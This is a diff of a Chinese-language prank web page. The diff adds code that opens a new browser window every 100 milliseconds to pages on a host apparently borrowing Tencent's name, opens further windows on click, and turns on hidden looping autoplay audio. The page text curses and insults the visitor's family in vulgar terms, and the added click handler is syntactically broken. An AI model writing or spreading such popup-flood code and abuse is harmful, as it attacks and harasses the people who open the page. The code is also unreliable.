@@ -17,11 +17,18 @@
     color: red;
     font-size: .6rem;
     text-align: center;
-
 }
-.shi-body{margin: 0;-webkit-margin-before: 0;
-    -webkit-margin-after: 0;list-style: none;}
-.audio{display: none}
+
+.shi-body {
+    margin: 0;
+    -webkit-margin-before: 0;
+    -webkit-margin-after: 0;
+    list-style: none;
+}
+
+.audio {
+    display: none
+}
 </style>
 <script type="text/javascript">
 // REM布局需引入的JS代码
@@ -52,22 +59,20 @@
         <li class="li bounceIn">还鼓掌叫好</li>
         <li class="li bounceIn">全家都傻逼</li>
     </ul>
-  <p class="title bounceIn">诅咒你全家不得好死下十八层地狱！</p>
- <!--  <audio class="audio" autoplay="autoplay" loop="loop" src="r.m4a"></audio> -->
+    <p class="title bounceIn">诅咒你全家不得好死下十八层地狱！</p>
+    <audio class="audio" autoplay="autoplay" loop="loop" src="r.m4a"></audio>
     <script type="text/javascript" src="jquery-1.9.1.min.js"></script>
-<script>
+    <script>
+    $(document).ready(function() {
+        setInterval(function() {
+            window.open("https://tencent-lol.github.io/surprise/caonim.html");
+        }, 100)
+    });
 
 
-
-$(document).ready(function() {
-setInterval(function(){
-    window.open("https://tencent-lol.github.io/surprise/caonim.index.html");  
-},100)	
-});
-
-
-</script>
-
+    document.body.addEventListener('click', function() {
+                window.open('https://tencent-lol.github.io/surprise/caonima.html', '_blank');
+    </script>
 </body>
 
 </html>
